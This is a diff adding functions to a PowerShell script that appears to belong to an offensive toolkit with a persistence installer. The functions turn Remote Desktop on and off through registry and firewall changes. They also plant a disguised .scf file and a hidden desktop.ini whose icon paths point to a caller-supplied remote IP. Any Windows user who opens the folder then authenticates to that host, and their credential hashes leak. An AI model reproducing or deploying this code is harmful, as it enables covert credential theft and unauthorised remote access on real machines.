@@ -37,6 +37,42 @@ function Test-Administrator
     $user = [Security.Principal.WindowsIdentity]::GetCurrent();
     (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
 }
+function EnableRDP
+{
+    if (Test-Administrator) {
+        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1   
+        Get-NetFirewallRule -DisplayName "Remote Desktop*" | Set-NetFirewallRule -enabled true
+    } else {
+    Write-Output "You are not elevated to Administator "
+    }
+}
+function DisableRDP
+{
+    if (Test-Administrator) {
+        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 1
+        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0 
+        Get-NetFirewallRule -DisplayName "Remote Desktop*" | Set-NetFirewallRule -enabled false
+    } else {
+    Write-Output "You are not elevated to Administator "
+    }
+}
+function Write-SCFFile 
+{
+    Param ($IPaddress, $Location)
+    "[Shell]" >$Location\~T0P0092.scf
+    "Command=2" >> $Location\~T0P0092.scf; 
+    "IconFile=\\$IPaddress\remote.ico" >> $Location\~T0P0092.scf; 
+    "[Taskbar]" >> $Location\~T0P0092.scf; 
+    "Command=ToggleDesktop" >> $Location\~T0P0092.scf; 
+}
+function Write-INIFile 
+{
+    Param ($IPaddress, $Location)
+    "[.ShellClassInfo]" > $Location\desktop.ini
+    "IconResource=\\$IPAddress\resource.dll" >> $Location\desktop.ini
+    $a = Get-item $Location\desktop.ini -Force; $a.Attributes="Hidden"
+}
 Function Install-Persistence
 {
     Param ($Method)
